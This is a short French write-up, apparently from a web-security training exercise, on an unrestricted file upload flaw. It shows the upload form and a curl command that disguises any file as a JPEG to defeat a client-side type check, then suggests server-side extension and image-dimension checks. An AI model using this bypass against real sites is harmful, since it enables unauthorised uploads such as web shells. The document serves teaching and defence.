# Explication
Dans la page ***Add Image*** on peut upload des fichiers grâce au formulaire suivant

```html
<form enctype="multipart/form-data" action="#" method="POST">

	<input type="hidden" name="MAX_FILE_SIZE" value="100000" />
	Choose an image to upload:
	<br />
	<input name="uploaded" type="file" /><br />
	<br />
	<input type="submit" name="Upload" value="Upload">

</form>
```

Le site accepte seulement les fichiers ***jpeg*** mais grâce au formulaire on sait ce qu'il envoie et on peut utiliser ***cURL*** pour envoyer autre chose

```shell
curl -X POST -F Upload=Upload -F 'uploaded=@FILE_TO_UPLOAD;type=image/jpeg' 'http://IP/?page=upload'
```

Cette commande cURL permet d'envoyer n'importe quel fichier en le faisant passer pour un jpeg

# Comment l'eviter ?
Pour eviter ce genre de problème on peut vérifier l'extention du fichier en back-end et essayer de récupérer des informations propres à ce type de fichier comme la taille (*width/height*) pour une image

source : https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload